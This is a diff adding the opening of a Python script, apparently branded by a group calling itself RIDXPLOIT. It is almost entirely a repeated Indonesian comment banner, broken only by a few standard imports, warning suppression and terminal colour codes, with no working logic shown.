+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+import webbrowser
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+import warnings
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+from multiprocessing.dummy import Pool as ThreadPool
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+from datetime import datetime
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+# Nonaktifkan warning dari requests/urllib3
+warnings.filterwarnings("ignore")
+
+# ANSI color codes
+G = '\033[92m'   # Green
+R = '\033[91m'   # Red
+Y = '\033[93m'   # Yellow
+B = '\033[94m'   # Blue
+C = '\033[96m'   # Cyan
+W = '\033[0m'    # White / Rese
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
